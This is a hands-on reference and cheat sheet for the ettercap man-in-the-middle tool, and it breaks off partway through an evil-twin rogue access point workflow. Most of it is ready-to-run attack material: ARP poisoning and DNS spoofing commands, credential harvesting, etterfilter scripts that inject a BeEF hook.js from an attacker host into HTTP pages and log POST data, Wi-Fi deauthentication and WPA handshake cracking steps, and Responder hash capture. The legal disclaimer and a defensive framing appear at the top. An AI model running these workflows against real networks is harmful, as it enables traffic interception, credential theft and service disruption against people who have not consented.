# Ettercap: Practical Reference, Workflows & Cheat Sheet

A working reference for ettercap the classic man-in-the-middle framework for ARP poisoning, DNS spoofing, traffic interception, credential sniffing, and filter-based traffic manipulation on local networks. This doc covers ettercap itself, common MITM workflows, pairing with other tools (aircrack-ng suite, bettercap, Responder, Wireshark, mitmproxy), and an honest discussion of what still works in 2026 and what's been obsoleted by HSTS, TLS 1.3, and modern endpoint protection.

---

## Legal Disclaimer

Considering the questioning legality regarding the use cases of what I'm about to describe PLEASE read this before going any further. Unauthorized use of ANY of these techniques will result in criminal charges, civil liability, employment termination, loss of professional certifications, and permanent damage to your career.

The techniques and tools described here ARP poisoning, DNS spoofing, credential sniffing, deauthentication attacks, traffic interception are **active network attacks**. In most jurisdictions (including but not limited to the United States, United Kingdom, European Union member states, Canada, Australia, and most of Asia), performing these actions against networks or devices you do not own, or without explicit written authorization from the owner, is a criminal offense.

Relevant laws you would be breaking include:
- **United States:** Computer Fraud and Abuse Act, Electronic Communications Privacy Act, Wiretap Act
- **United Kingdom:** Computer Misuse Act 1990, Investigatory Powers Act 2016, Regulation of Investigatory Powers Act 2000
- **European Union:** GDPR (for intercepted personal data), individual member state computer-misuse legislation
- **Canada:** Criminal Code 184, 342.1, 430(1.1)
- **Australia:** Criminal Code Act 1995, Part 10.7

**Before performing any of the activities in this document, you must have one of the following:**

1. **Ownership** of the network and all devices being tested, *and* the informed consent of anyone whose traffic may be intercepted (including household members, guests, etc.)
2. **A written authorization / rules of engagement** (ROE) document from the network owner specifically permitting the described activities, with defined scope, time windows, and contact procedures
3. **An isolated lab environment** you have built for research, with no production traffic, no third-party devices, and no connection to networks you don't control


**Specifically note:**

- Intercepting wireless traffic on networks you don't own is illegal in most jurisdictions **even if the network is open/unencrypted**. The unencrypted state does not imply consent.
- Deauthentication attacks against 802.11 networks disrupt service and, separately from any data interception, may constitute an unauthorized interference with communications (illegal under FCC rules in the US, Ofcom rules in the UK, and equivalent regulations elsewhere). The FCC has fined hotels and conference venues for performing deauth against guest devices on their own property.
- Capturing handshakes passively may be more defensible than active deauth in some jurisdictions, but "passive" is a thin distinction when the handshake is then used to derive a key for a network you don't own.
- "Red team" and "pentest" activities require **written authorization from someone with actual authority to grant it** (typically a senior executive or board-approved document). A friendly verbal "sure, go ahead" from a mid-level contact does not protect you legally if something goes wrong.
- Research activities in a home lab against your own devices are generally safe, but the moment a household member, roommate, guest, or neighbor's device joins the network you're testing against, you are intercepting their traffic without consent. This matters.

**This document is for use in authorized engagements, academic research in isolated environments, CTF/lab work, and defensive understanding of how these attacks work so defenders can detect and mitigate them. Use it accordingly.**

If you're unsure whether something is legal for you to do the answer is to not do it until you've talked to a lawyer or your organization's legal counsel.

---

## Table of Contents

1. [What Ettercap Actually Is (and Isn't in 2026)](#what-ettercap-actually-is-and-isnt-in-2026)
2. [Installation & Setup](#installation--setup)
3. [Core Concepts](#core-concepts)
4. [Interfaces: Curses, GTK, CLI](#interfaces-curses-gtk-cli)
5. [How-To: Common Attacks](#how-to-common-attacks)
6. [Filters (etterfilter)](#filters-etterfilter)
7. [Pairing with Other Tools](#pairing-with-other-tools)
8. [End-to-End Workflows](#end-to-end-workflows)
9. [Cheat Sheet](#cheat-sheet)
10. [Detection & Defense](#detection--defense)
11. [Practical Notes](#practical-notes)

---

## What Ettercap Actually Is (and Isn't in 2026)

Ettercap is a framework for launching **man-in-the-middle attacks on local networks**. Its core capabilities are:

- **ARP poisoning** inserting itself into the traffic path between hosts on a LAN
- **ICMP redirect** alternative L3 redirection
- **DHCP spoofing** giving hosts bad gateway/DNS via rogue DHCP
- **Port stealing** MAC table manipulation on switches that don't support ARP-spoof mitigation
- **Passive sniffing** reading plaintext protocols on the wire
- **Filter-based packet manipulation** modifying traffic as it passes through
- **Plugin architecture** DNS spoofing, credential harvesting, SSL certificate forging, etc.

Ettercap was written in an era (early 2000s) when most web traffic was HTTP, email was plaintext POP3/IMAP, and LANs were hubs with no switch security. It was extraordinarily effective in that environment. In 2026, the landscape is different and **a lot of what ettercap historically did no longer works or has dramatically reduced utility**:

- **HTTPS is everywhere.** The classic ettercap credential-sniffing workflow (sit on the wire, watch people log into websites in plaintext) is effectively dead for web traffic. Every site that matters uses TLS.
- **HSTS breaks sslstrip.** The `sslstrip` technique of downgrading HTTPS connections to HTTP worked against users visiting sites via `http://`, but HSTS preloading means modern browsers refuse to connect to major sites over HTTP at all. Sslstrip is a historical curiosity now.
- **Certificate pinning and HPKP-descendants** mean that even if you present a valid-but-attacker-controlled certificate, pinned applications (mobile apps especially) will refuse to connect.
- **TLS 1.3 encrypts more of the handshake**, reducing metadata leakage.
- **DNS-over-HTTPS / DNS-over-TLS** bypasses classic DNS spoofing for any device configured to use them (increasingly the default on modern OSes).
- **Windows has dropped LLMNR/NBT-NS defaults** and added SMB signing requirements that break many classic LAN attacks.

**What still works:**

- **Plaintext protocols on internal networks** legacy apps, industrial protocols (Modbus, S7, DNP3), medical devices, printer protocols, some database connections, internal HTTP admin panels, telnet, FTP, SNMP, TFTP, etc. Internal networks are full of this.
- **DNS spoofing against devices using DHCP-provided resolvers** which is most IoT, most unmanaged devices, and any device where DoH/DoT isn't configured.
- **ARP poisoning itself** the technique works against any switched LAN where the network hardware doesn't implement Dynamic ARP Inspection (DAI), which is most SMB networks and nearly all home networks.
- **Traffic modification for specific protocols** injecting into plaintext HTTP, modifying DNS responses, rewriting cleartext data on the wire.
- **Credential capture from legacy/misconfigured services** plenty of internal apps still use HTTP basic auth, form-based login over HTTP, or other plaintext auth.
- **As a visibility tool in labs and research** ettercap is genuinely useful for understanding how these attacks work, how they look on the wire, and how to detect them.

**The honest modernization note:** **bettercap** is the spiritual successor to ettercap and is more actively maintained, has better TLS handling, supports HTTPS proxying with cert generation, has a more usable scripting interface, and handles modern networks more cleanly. Most practitioners who would have used ettercap in 2010 use bettercap in 2026. Ettercap is still functional and has its place (filter language, plugin ecosystem, curses UI some people prefer), but **if you're starting from scratch, learn bettercap instead.** This document covers ettercap because it's what you asked about and because it's still relevant in specific contexts, but bettercap is the tool to reach for on most real engagements.

---

## Installation & Setup

### Install

```bash
# Debian/Ubuntu/Kali
sudo apt update
sudo apt install ettercap-graphical ettercap-text-only

# Arch
sudo pacman -S ettercap

# From source (for latest)
git clone https://github.com/Ettercap/ettercap.git
cd ettercap
mkdir build && cd build
cmake ../
make
sudo make install
```

Two binaries get installed:
- `ettercap-text` (or `ettercap` on some systems) curses/CLI version
- `ettercap-graphical` GTK+ GUI

### Configuration

Main config: `/etc/ettercap/etter.conf`

Key settings to check before first use:

```ini
[privs]
ec_uid = 0              # Run as root for raw socket access
ec_gid = 0

[mitm]
# Timing settings for poisoning
arp_storm_delay = 10
arp_poison_smart = 0
arp_poison_warm_up = 1
arp_poison_delay = 10

[connections]
connection_timeout = 300
connection_idle = 60
connection_buffer = 10000
connection_hook = 100

# Uncomment the iptables redir commands for SSL MITM
# (needed for sslstrip / HTTPS interception workflows)
#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
```

The redir commands are commented out by default uncomment them if you intend to use SSL interception plugins or chain with sslstrip/mitmproxy. Without them, HTTPS traffic won't be redirected to your proxy.

### DNS Spoofing Config

Host-to-IP mappings for `dns_spoof` plugin: `/etc/ettercap/etter.dns`

Example entries:
```
# Wildcard: point every DNS A query to our IP
*              A   10.0.0.50

# Specific domains
login.example.com    A   10.0.0.50
*.corp.local         A   10.0.0.50

# IPv6
login.example.com    AAAA ::1

# MX records
example.com          MX   mail.attacker.tld
```

### Enable IP Forwarding

For any MITM that sits between two hosts (which is most of them), the attacker's machine must forward packets between them after interception. Ettercap handles this internally via its own forwarding logic, but you can also enable kernel forwarding as a fallback:

```bash
# Linux
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Verify
sysctl net.ipv4.ip_forward
```

Without forwarding, ARP poisoning creates a **black hole** you receive the victim's traffic but never deliver it to the real gateway, breaking their connectivity and making the attack obvious within seconds.

---

## Core Concepts

### Sniffing Modes

Ettercap operates in one of two sniffing modes:

**Unified sniffing (`-M`, `-T -M`, `-G -M`)** single interface. The attacker is on the same LAN as both endpoints. ARP poisoning redirects traffic through the attacker's NIC, which then forwards it. This is the common case for LAN attacks.

**Bridged sniffing (`-B`)** two interfaces. The attacker is physically inline between two network segments and bridges packets between them. Stealthier (no ARP manipulation needed, invisible at L2) but requires physical inline placement. Useful for dedicated MITM hardware drops or lab rigs.

### Targets

Ettercap uses target specifications to scope attacks:

```
MAC/IPs/PORTs
```

Examples:

| Target string | Meaning |
|---|---|
| `//` | All hosts on the LAN |
| `/10.0.0.1//` | Only host 10.0.0.1 |
| `/10.0.0.1-50//` | Range |
| `/10.0.0.0/24//` | CIDR |
| `///80` | Any host, port 80 only |
| `/10.0.0.1/80,443` | Host 10.0.0.1, ports 80 and 443 |
| `AA:BB:CC:DD:EE:FF/10.0.0.1/` | Specific MAC+IP |

Typical ARP-poisoning invocation uses **two targets** `TARGET1` and `TARGET2` to specify both sides of the traffic path:

```bash
# Poison between victim (10.0.0.5) and gateway (10.0.0.1)
ettercap -T -M arp:remote /10.0.0.5// /10.0.0.1//
```

`arp:remote` enables bidirectional poisoning so both sides see the attacker as the other. `arp:oneway` only poisons one side (rare use case).

### Plugins

Ettercap has a plugin system for automated actions. List plugins:

```bash
ettercap -P list
```

High-value plugins:

| Plugin | Purpose |
|---|---|
| `dns_spoof` | DNS response spoofing (uses `/etc/ettercap/etter.dns`) |
| `arp_cop` | Detect ARP poisoning on the network (defensive) |
| `autoadd` | Auto-add new hosts to the target list |
| `chk_poison` | Verify ARP poisoning is working |
| `dos_attack` | DoS a host |
| `find_conn` | Find connections on the network |
| `find_ip` | Find unused IPs |
| `finger` | OS fingerprinting |
| `gre_relay` | GRE tunnel relay |
| `gw_discover` | Gateway discovery |
| `isolate` | Isolate a host from the LAN |
| `link_type` | Detect hub vs switch |
| `mdns_spoof` | mDNS response spoofing |
| `nbns_spoof` | NBNS response spoofing |
| `pptp_*` | Various PPTP attacks (historical) |
| `rand_flood` | Flood LAN with random MACs |
| `remote_browser` | Track remote victim browsing |
| `repoison_arp` | Re-poison after gratuitous ARP |
| `search_promisc` | Find hosts in promisc mode |
| `smb_clear` / `smb_down` | Force SMB downgrade |
| `sslstrip` | Downgrade HTTPS (mostly dead, see discussion above) |
| `stp_mangler` | STP manipulation |

Run a plugin from the CLI:
```bash
ettercap -T -M arp:remote -P dns_spoof /10.0.0.5// /10.0.0.1//
```

Or load interactively via the `p` key in curses, or menu in GTK.

---

## Interfaces: Curses, GTK, CLI

Ettercap has three interfaces, selected at launch:

| Flag | Interface | When to use |
|---|---|---|
| `-T` | Text/curses | SSH sessions, scripted workflows, lightweight |
| `-G` | GTK+ GUI | Interactive exploration, visual host/connection lists |
| `-D` | Daemon (no UI) | Pure background ops with logging to file |
| `-C` | Curses (alias for -T on some builds) | Same as -T |

### Curses Interface Shortcuts (within `-T`)

| Key | Action |
|---|---|
| `h` | Help |
| `q` | Quit |
| `s` | Stats |
| `l` | Show hosts list |
| `c` | Sort connections |
| `v` | Visualization mode |
| `o` | Show profiles |
| `p` | Plugin menu |
| `f` | Start/stop filters |
| `space` | Pause sniffing |

### GTK Interface Notes

The GUI is fine for lab exploration but tends to be unstable on modern distributions. Layout: Sniff menu → Hosts menu → Mitm menu → Plugins menu → Filters menu. Workflow is typically:

1. `Sniff → Unified sniffing` → pick interface
2. `Hosts → Scan for hosts` → builds target list
3. `Hosts → Hosts list` → select targets, add to Target 1 / Target 2
4. `Mitm → ARP poisoning` → start MITM
5. `Plugins → Manage plugins` → enable e.g. `dns_spoof`
6. `Start → Start sniffing`

### Running Headless

For scripted workflows:
```bash
ettercap -T -q -M arp:remote \
  -P dns_spoof \
  -l session.log \
  -L session \
  /10.0.0.5// /10.0.0.1//
```

`-q` = quiet (no packet printing), `-l` = log file (text), `-L` = log binary (for later analysis).

---

## How-To: Common Attacks

Every example below assumes: (1) you're on the target LAN, (2) IP forwarding is enabled, (3) you've identified targets via initial recon (`arp-scan`, `nmap -sn`, `netdiscover`).

### 1. Host Discovery Before MITM

```bash
# Fast ARP sweep of the local subnet
sudo arp-scan --localnet

# Or with nmap
sudo nmap -sn 10.0.0.0/24

# Or with netdiscover (passive + active)
sudo netdiscover -i wlan0 -r 10.0.0.0/24
```

Identify:
- The gateway (usually `.1` or `.254` confirm with `ip route`)
- The target host(s)
- Note their MAC addresses

### 2. Basic ARP Poisoning MITM (Full LAN)

Poison every host on the LAN simultaneously. High noise, high coverage:

```bash
sudo ettercap -T -i eth0 -M arp:remote // //
```

Both targets specified as `//` means "all hosts." This is rarely what you want on a real engagement because it creates massive ARP broadcast traffic and breaks connectivity for everyone if your forwarding is wrong.

### 3. Targeted ARP Poisoning (Victim ↔ Gateway)

The standard MITM setup you want victim `10.0.0.5`'s traffic to/from the gateway `10.0.0.1`:

```bash
sudo ettercap -T -i eth0 -M arp:remote /10.0.0.5// /10.0.0.1//
```

Verify with `arp -n` on the victim:
```
Address    HWtype  HWaddress           Flags Mask  Iface
10.0.0.1   ether   aa:bb:cc:dd:ee:ff   C           eth0
```
`aa:bb:cc:dd:ee:ff` should be the attacker's MAC, not the real gateway's MAC. If it still shows the real gateway, the poison isn't working check that ettercap is actually running, the victim isn't using static ARP, and the switch isn't running Dynamic ARP Inspection.

### 4. DNS Spoofing

Redirect specific domain lookups to attacker-controlled hosts.

Edit `/etc/ettercap/etter.dns`:
```
login.corp.local     A    10.0.0.50
*.corp.local         A    10.0.0.50
```

Run ettercap with the `dns_spoof` plugin:
```bash
sudo ettercap -T -i eth0 -M arp:remote -P dns_spoof /10.0.0.5// /10.0.0.1//
```

When the victim queries `login.corp.local`, ettercap intercepts the DNS response (which is flowing through it due to ARP poisoning) and replaces the answer with `10.0.0.50`. Victim then tries to connect to the attacker's server instead of the real one.

**Note:** This only works for classic DNS (UDP port 53). Devices using DoH (DNS-over-HTTPS) or DoT (DNS-over-TLS) bypass this entirely because the DNS queries are encrypted inside HTTPS/TLS and ettercap can't inspect or modify them. Modern browsers often default to DoH.

### 5. ICMP Redirect MITM

Alternative to ARP poisoning useful when DAI blocks ARP attacks but ICMP redirects are still accepted:

```bash
sudo ettercap -T -i eth0 -M icmp:aa:bb:cc:dd:ee:ff/10.0.0.1 /10.0.0.5// /10.0.0.1//
```

The `icmp:` syntax takes `MAC/IP` of the real gateway as argument. Ettercap sends ICMP redirect messages to the victim telling it to route through the attacker. Rarely works on modern OSes Linux and Windows ignore ICMP redirects by default since the early 2010s.

### 6. DHCP Spoofing

Hand out rogue DHCP leases with attacker as gateway/DNS:

```bash
sudo ettercap -T -i eth0 -M dhcp:10.0.0.100-110/255.255.255.0/10.0.0.50
```

Arguments: `IP_pool / netmask / DNS_server`. Ettercap responds to DHCP DISCOVER broadcasts faster than the legitimate DHCP server (or during the legitimate server's downtime) and hands out leases that make the attacker the gateway.

Works well in environments where the legitimate DHCP server is slow or down, and against devices that accept the first response (most of them).

### 7. Port Stealing

Alternative MITM method using MAC table manipulation on the switch:

```bash
sudo ettercap -T -i eth0 -M port /10.0.0.5// /10.0.0.1//
```

Ettercap floods the switch with packets claiming the victim's MAC is on the attacker's switch port. The switch updates its MAC table and starts sending victim-destined frames to the attacker. Works on switches that don't implement port security. Quieter than ARP poisoning at L3 but leaves heavy traces in switch logs.

### 8. Passive Sniffing (No MITM)

Just capture what's already visible on the local segment:

```bash
sudo ettercap -T -i eth0 -q
```

On a switched network this only captures broadcast/multicast traffic and traffic to/from the attacker itself useful for grabbing ARP, mDNS, SSDP, NBNS, LLMNR, and other broadcast chatter. On a hub (rare) or a mirrored span port (common in lab setups), you see everything.

### 9. Credential Harvesting

Ettercap automatically identifies plaintext credentials for dozens of protocols during sniffing:

```bash
sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.5// /10.0.0.1// -l capture
```

Captured creds are logged to the terminal as they appear and saved to `capture.eci`/`capture.ecp`. Protocols with credential dissectors include:
- FTP, Telnet, SMTP, POP3, IMAP (plaintext versions)
- HTTP basic and form-based auth (plaintext)
- SNMP v1/v2c community strings
- VNC (where auth is weak)
- SMB challenge/response (captured for offline cracking)
- IRC, ICQ, Yahoo, MSN (all historical)
- NFS, RPC
- MySQL/PostgreSQL (plaintext auth mode)
- Various legacy protocols

### 10. Traffic Filtering (Modification)

Use etterfilter scripts to modify traffic in transit. See the [Filters section](#filters-etterfilter) for syntax. Example replace all instances of "secure" with "INSECURE" in HTTP traffic:

```
# filter.filter
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "secure")) {
      replace("secure", "INSECURE");
      msg("replaced\n");
   }
}
```

Compile and use:
```bash
etterfilter filter.filter -o filter.ef
sudo ettercap -T -i eth0 -M arp:remote -F filter.ef /10.0.0.5// /10.0.0.1//
```

### 11. SSL/TLS Interception (The Hard Mode)

Ettercap's SSL interception (sometimes called "SSL sniffing" or the `ssl_mitm` feature) presents a forged certificate to the victim and decrypts traffic if the victim accepts it. In practice:

- Victim will get a certificate warning in their browser (because your cert is not trusted by their trust store)
- Users who click through the warning allow the MITM
- Mobile apps with certificate pinning **refuse to connect** regardless
- HSTS-preloaded sites **refuse to connect** unless the cert chains to a system-trusted CA

The practical takeaway: ettercap's SSL interception is mostly useful in labs or against users who ignore cert warnings (which is fewer people than it was a decade ago). For real TLS interception on legitimate engagements, **chain with mitmproxy or Burp** and generate a CA cert that you've pre-installed on the victim device (with authorization). See the pairing section for how.

### 12. Stopping Cleanly

When you `q` out of ettercap or send SIGTERM, it sends "healing" ARP packets to restore the correct ARP entries on all affected hosts. **This is critical.** If you kill ettercap abruptly (SIGKILL), the ARP tables on victims and the gateway will still point to your MAC, breaking the LAN until the entries expire (usually 60-600 seconds depending on OS).

Always exit cleanly. If you need to verify healing worked, run `arp -n` on the victim and confirm the gateway entry shows the real gateway MAC.

---

## Filters (etterfilter)

Ettercap's filter language is C-like and compiled with `etterfilter` into `.ef` bytecode. Filters run against every packet flowing through ettercap and can match, modify, drop, or log traffic.

### Filter Language Basics

```c
# Comment

# Conditions
if (ip.proto == TCP && tcp.dst == 80) {
   # actions
}

# Available fields:
# ip.proto, ip.src, ip.dst, ip.ttl
# tcp.src, tcp.dst, tcp.flags
# udp.src, udp.dst
# eth.src, eth.dst, eth.proto
# DATA.data (packet payload)
# DATA.length
```

### Built-in Functions

| Function | Purpose |
|---|---|
| `search(where, what)` | Search for string in field |
| `regex(where, pattern)` | Regex match |
| `replace(what, with)` | Replace substring in DATA.data |
| `inject(filename)` | Inject file contents into packet |
| `execute(command)` | Run a shell command |
| `drop()` | Drop the packet |
| `kill()` | Kill the connection |
| `log(where, filename)` | Log field to file |
| `msg(string)` | Print message to ettercap console |
| `exit()` | Stop filter processing for this packet |

### Example Filters

**Replace images with a troll image (the classic demo):**
```c
if (ip.proto == TCP && tcp.src == 80) {
   replace("img src=", "img src=\"http://10.0.0.50/troll.jpg\" ignored=");
   replace("IMG SRC=", "img src=\"http://10.0.0.50/troll.jpg\" ignored=");
   msg("Image replaced\n");
}

# Kill gzip encoding so we can see the HTML
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Rubbish!");
      msg("zapped Accept-Encoding\n");
   }
}
```

**Log all HTTP POSTs to a file:**
```c
if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "POST")) {
      log(DATA.data, "./posts.log");
   }
}
```

**Drop traffic to a specific domain (targeted DoS-in-transit):**
```c
if (ip.proto == TCP) {
   if (search(DATA.data, "Host: ads.example.com")) {
      drop();
      msg("Dropped ad request\n");
   }
}
```

**Inject JavaScript into HTTP responses (BeEF hook injection see pairing):**
```c
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "</body>")) {
      replace("</body>", "<script src=\"http://10.0.0.50:3000/hook.js\"></script></body>");
      msg("BeEF hook injected\n");
   }
}
```

### Compiling Filters

```bash
etterfilter myfilter.filter -o myfilter.ef
```

Errors in filter syntax are reported at compile time. The `.ef` file is what you pass to ettercap:

```bash
sudo ettercap -T -i eth0 -M arp:remote -F myfilter.ef /10.0.0.5// /10.0.0.1//
```

### Filter Caveats

- **Filters only work on plaintext protocols.** You can't `replace()` inside TLS traffic ettercap sees encrypted blobs and can't modify the content meaningfully.
- **Replacements must preserve packet length** or TCP reassembly breaks. This is why the image replacement example uses `ignored=` to pad and why length-neutral substitution is the common pattern.
- **Filters run per-packet, not per-stream.** If a keyword you're matching spans two packets, you won't catch it. For stream-level manipulation, use a proxy (mitmproxy, Burp) instead.
- **Modifying HTTPS requires successful cert MITM first**, which brings all the HSTS/pinning issues discussed above.

---

## Pairing with Other Tools

Ettercap is rarely used alone on real work. It chains with other tools to form end-to-end attack workflows.

### With `aircrack-ng` Suite (Wireless → LAN)

The aircrack-ng suite handles 802.11-layer attacks (deauth, handshake capture, WPA2 cracking). Ettercap handles the LAN-layer attacks once you're *on* the network. The pairing: crack or otherwise join a wireless network, then run ettercap against it.

**Toolchain:**

| Tool | Role |
|---|---|
| `airmon-ng` | Put wireless card into monitor mode |
| `airodump-ng` | Scan for APs and capture traffic / handshakes |
| `aireplay-ng` | Inject frames (deauth, fake auth, etc.) |
| `aircrack-ng` | Crack WEP/WPA handshakes |
| `hashcat` | Faster WPA2 cracking via GPU (use this instead of aircrack-ng for real work) |
| `hcxdumptool` / `hcxpcapngtool` | Modern handshake capture (PMKID + 4-way) |

See the [WPA2 handshake capture workflow](#workflow-wpa2-handshake-capture--mitm) below for the full chain.

### With `bettercap`

Bettercap can do everything ettercap does and more, but the two can coexist: use bettercap for modules ettercap lacks (HTTPS proxy with auto cert generation, WiFi attacks built-in, BLE, HID injection) and ettercap for filter-based manipulation or the curses UI. In practice most people pick one. If you're using bettercap, skip ettercap for MITM and use bettercap's `arp.spoof` module.

```bash
# Bettercap equivalent of the ettercap DNS spoof example
sudo bettercap -iface eth0
> set arp.spoof.targets 10.0.0.5
> arp.spoof on
> set dns.spoof.domains login.corp.local,*.corp.local
> set dns.spoof.address 10.0.0.50
> dns.spoof on
> net.sniff on
```

### With Responder

Responder handles LLMNR/NBT-NS/mDNS poisoning and rogue WPAD/SMB/HTTP servers for capturing NTLMv1/v2 hashes. Ettercap handles ARP-level traffic redirection. Running them together amplifies both:

- Responder captures broadcast-based name resolution poisoning
- Ettercap redirects unicast traffic via ARP poisoning so Responder sees more of it
- Combined, you catch hashes from devices that wouldn't otherwise route traffic through you

```bash
# Terminal 1: Responder in analyze mode first to establish baseline
sudo responder -I eth0 -A

# Terminal 2: Ettercap ARP poisoning against the subnet
sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.0/24// /10.0.0.1//

# Terminal 3: Responder active
sudo responder -I eth0 -wF
```

### With Wireshark / tcpdump

Ettercap's own packet display is limited. For real analysis:

```bash
# Run ettercap with logging
sudo ettercap -T -q -i eth0 -M arp:remote -w ettercap.pcap /10.0.0.5// /10.0.0.1//
```

The `-w` flag writes pcap output that can be opened in Wireshark. Alternatively, run tcpdump or Wireshark in parallel on the same interface:

```bash
# Terminal 1: ettercap (doing the MITM)
sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.5// /10.0.0.1//

# Terminal 2: wireshark or tcpdump for analysis
sudo tcpdump -i eth0 -w capture.pcap 'host 10.0.0.5'
```

This is usually cleaner than ettercap's built-in logging Wireshark's display filters and dissectors are strictly better.

### With mitmproxy (TLS Interception)

For real TLS interception where you want to actually read and modify HTTPS traffic, chain ettercap for L2 redirection with mitmproxy for L7 TLS termination:

```bash
# 1. Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 2. iptables: redirect HTTP/HTTPS traffic to mitmproxy's port
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# 3. Start mitmproxy in transparent mode
mitmproxy --mode transparent --showhost

# 4. Start ettercap ARP poisoning (without SSL plugins mitmproxy handles TLS)
sudo ettercap -T -q -i eth0 -M arp:remote /10.0.0.5// /10.0.0.1//
```

Victim traffic now flows: victim → attacker (via ARP poison) → iptables redirect → mitmproxy (which decrypts using its own CA cert) → real destination. Mitmproxy's CA cert must be installed on the victim for this to work without warnings. In authorized engagements where you have admin access to test devices, this is the standard setup.

### With BeEF (Browser Exploitation Framework)

Classic combo: inject BeEF's `hook.js` into HTTP responses via ettercap filter, then drive browsers from BeEF's control panel.

```bash
# 1. Start BeEF
sudo beef-xss

# 2. Create filter that injects hook
cat > beef_inject.filter << 'EOF'
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "</body>")) {
      replace("</body>", "<script src=\"http://10.0.0.50:3000/hook.js\"></script></body>");
      msg("BeEF hook injected\n");
   }
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Rubbish!");
   }
}
EOF

# 3. Compile
etterfilter beef_inject.filter -o beef_inject.ef

# 4. Run ettercap with filter
sudo ettercap -T -q -i eth0 -M arp:remote -F beef_inject.ef /10.0.0.5// /10.0.0.1//
```

Obvious caveats: only works against HTTP traffic (not HTTPS), only against browsers not using HTTPS-Only mode, and BeEF itself is mostly educational in 2026 since browser sandboxing defeats most of its historical exploit modules. Still useful for lab demos.

### With `arpspoof` (dsniff suite)

`arpspoof` from the `dsniff` suite is a minimalist alternative to ettercap's ARP poisoning. Sometimes cleaner when you just need the poisoning without ettercap's full framework:

```bash
# Poison victim
sudo arpspoof -i eth0 -t 10.0.0.5 10.0.0.1

# In another terminal, poison the gateway (bidirectional)
sudo arpspoof -i eth0 -t 10.0.0.1 10.0.0.5
```

Pair with `dsniff`, `urlsnarf`, `mailsnarf` from the same suite for specific protocol extraction. The dsniff suite predates ettercap and is simpler to script, though less featureful.

---

## End-to-End Workflows

### Workflow: Classic LAN MITM with DNS Spoof

**Goal:** intercept a specific victim's traffic and redirect a specific domain to an attacker-controlled landing page.

```bash
# 1. Identify targets
sudo arp-scan --localnet
# Note: victim 10.0.0.5, gateway 10.0.0.1

# 2. Set up the attacker web server on 10.0.0.50
python3 -m http.server 80 --directory ./landing-page &

# 3. Configure DNS spoofing
sudo tee -a /etc/ettercap/etter.dns <<EOF
login.corp.local    A    10.0.0.50
EOF

# 4. Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# 5. Launch ettercap
sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof \
  -l session -L session \
  /10.0.0.5// /10.0.0.1//

# 6. When done, clean exit with 'q' to trigger ARP healing
```

### Workflow: WPA2 Handshake Capture → MITM

**Goal:** capture a WPA2 handshake, crack it, join the network, then run ettercap against it.

**This workflow requires explicit authorization on any network you don't own.** See the legal disclaimer.

```bash
# 1. Put wireless card in monitor mode
sudo airmon-ng check kill         # kill processes that interfere (NetworkManager, wpa_supplicant)
sudo airmon-ng start wlan0
# Monitor interface is now wlan0mon (or similar)

# 2. Scan for target AP
sudo airodump-ng wlan0mon
# Note: BSSID, channel, client MAC addresses

# 3. Target-specific capture on the correct channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauth a connected client to force reconnect (captures 4-way handshake)
# deauth is VERY illegal without permission
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
# Watch airodump-ng for "WPA handshake: AA:BB:CC:DD:EE:FF" message at top

# Alternative: passive PMKID capture (no deauth, no client interaction needed)
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=15
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# 5. Crack with hashcat (GPU, much faster than aircrack-ng)
hashcat -m 22000 hash.hc22000 wordlist.txt
# Or aircrack-ng if no GPU:
# aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# 6. Stop monitor mode, restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager

# 7. Join the network with the cracked password
nmcli device wifi connect "TargetSSID" password "cracked_pw"

# 8. Now you're on the LAN run ettercap
sudo ettercap -T -q -i wlan0 -M arp:remote \
  -P dns_spoof -F myfilter.ef \
  /192.168.1.10// /192.168.1.1//
```

### Workflow: Evil Twin + Captive Portal

**Goal:** stand up a fake AP impersonating a legitimate one, get clients to connect, then MITM them. Requires deauth of the legitimate AP to push clients to yours.

**Again: only against networks and devices you own or have explicit authorization to test.**

Tools needed: `hostapd-wpe` (modified hostapd for rogue AP with credential capture), `dnsmasq` (DHCP/DNS for the rogue network), ettercap or bettercap.

```bash
# 1. Two wireless interfaces: wlan0 for rogue AP, wlan1 for deauth against real AP
sudo airmon-ng start wlan1

# 2. hostapd config for rogue AP (matching SSID of target)
cat > rogue.conf << EOF
interface=wlan0
driver=nl80211
ssid=TargetSSID
hw_mode=g
channel=6
wpa=2
wpa_passphrase=fakepassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

# 3. dnsmasq config for DHCP on the rogue AP interface
cat > dnsmasq.conf << EOF
interface=wlan0
dhcp-range=10.99.0.10,10.99.0.100,12h
dhcp-option=3,10.99.0.1
dhcp-option=6,10.99.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# 4. Configure rogue AP interface
sudo ip addr add 10.99.0.1/24 dev wlan0
sudo ip link set wlan0 up

# 5. Enable forwarding and NAT (so clients can reach the internet via rogue AP)
